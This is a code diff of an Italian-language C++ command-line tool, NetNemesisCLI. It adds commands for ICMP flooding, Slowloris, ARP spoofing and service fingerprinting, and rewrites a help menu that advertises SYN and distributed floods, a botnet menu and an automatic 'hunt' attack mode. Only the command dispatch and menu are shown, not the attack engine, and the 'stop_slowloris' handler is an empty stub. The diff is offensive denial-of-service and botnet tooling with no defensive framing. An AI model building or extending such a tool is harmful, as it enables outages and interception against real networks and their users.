@@ -132,19 +132,54 @@ void NetNemesisCLI::run() {
             scanner.stop();
             Utils::logInfo("Arrivederci!");
         }
+        else if (cmd == "fingerprint" && args.size() >= 3) {
+            ServiceFingerprinter fp;
+            auto info = fp.fingerprint(args[1], std::stoi(args[2]));
+            Utils::logSuccess("Servizio rilevato:");
+            std::cout << "  Nome: " << info.name << std::endl;
+            std::cout << "  Versione: " << info.version << std::endl;
+            std::cout << "  Info: " << info.extra_info << std::endl;
+        }
+        else if (cmd == "icmp" && args.size() >= 2) {
+            int packets = (args.size() > 2) ? std::stoi(args[2]) : 10000;
+            attack_engine.executeICMPFlood(args[1], packets);
+        }
+        else if (cmd == "slowloris" && args.size() >= 3) {
+            int conn = (args.size() > 3) ? std::stoi(args[3]) : 1000;
+            attack_engine.executeSlowloris(args[1], std::stoi(args[2]), conn);
+        }
+        else if (cmd == "arp" && args.size() >= 3) {
+            attack_engine.executeARPSpoof(args[1], args[2]);
+        }
+        else if (cmd == "stop_slowloris") {
+            // Aggiungi metodo per fermare slowloris
+            Utils::logInfo("Fermando Slowloris...");
+        }
         else if (cmd == "help") {
             std::cout << "\033[36m╔══════════════════════════════════════════════════════════════╗\n"
                          "║                    COMANDI DISPONIBILI                       ║\n"
                          "╠══════════════════════════════════════════════════════════════╣\n"
-                         "║  \033[33mbotnet\033[36m                - Menu configurazione botnet          ║\n"
-                         "║  \033[33mdos <ip> <port>\033[36m       - SYN Flood attack (raw packets)       ║\n"
-                         "║  \033[33mddos <ip> <port> [n]\033[36m  - Distributed attack con n bot        ║\n"
-                         "║  \033[33mscan\033[36m                  - Avvia scanner passivo              ║\n"
-                         "║  \033[33mscan_stop\033[36m             - Ferma scanner (ritorna al menu)    ║\n"
-                         "║  \033[33mhunt\033[36m                  - Toggle auto-attack mode            ║\n"
-                         "║  \033[33mservers\033[36m               - Lista server trovati             ║\n"
-                         "║  \033[33mclear\033[36m                 - Pulisci schermo                    ║\n"
-                         "║  \033[33mexit\033[36m                  - Esci dal tool                      ║\n"
+                         "║  \033[33mATTACCHI BASE\033[36m                                              ║\n"
+                         "║  dos <ip> <port>              - SYN Flood                    ║\n"
+                         "║  ddos <ip> <port> [n]         - Distributed SYN Flood        ║\n"
+                         "║  icmp <ip> [packets]          - ICMP Echo Flood              ║\n"
+                         "║  slowloris <ip> <port> [n]    - HTTP Slowloris attack        ║\n"
+                         "║  arp <target> <gateway>       - ARP Spoofing MITM          ║\n"
+                         "║                                                              ║\n"
+                         "║  \033[33mRICONNAISSANCE\033[36m                                             ║\n"
+                         "║  fingerprint <ip> <port>      - Service fingerprinting     ║\n"
+                         "║  scan                         - Network scanner              ║\n"
+                         "║  scan_stop                    - Ferma scanner              ║\n"
+                         "║  servers                      - Lista server trovati       ║\n"
+                         "║                                                              ║\n"
+                         "║  \033[33mBOTNET\033[36m                                                     ║\n"
+                         "║  botnet                       - Menu configurazione          ║\n"
+                         "║  hunt                         - Auto-attack mode             ║\n"
+                         "║                                                              ║\n"
+                         "║  \033[33mCONTROLLO\033[36m                                                 ║\n"
+                         "║  clear                        - Pulisci schermo              ║\n"
+                         "║  stop_slowloris               - Ferma Slowloris              ║\n"
+                         "║  exit                         - Esci                         ║\n"
                          "╚══════════════════════════════════════════════════════════════╝\033[0m" << std::endl;
         }
         else {
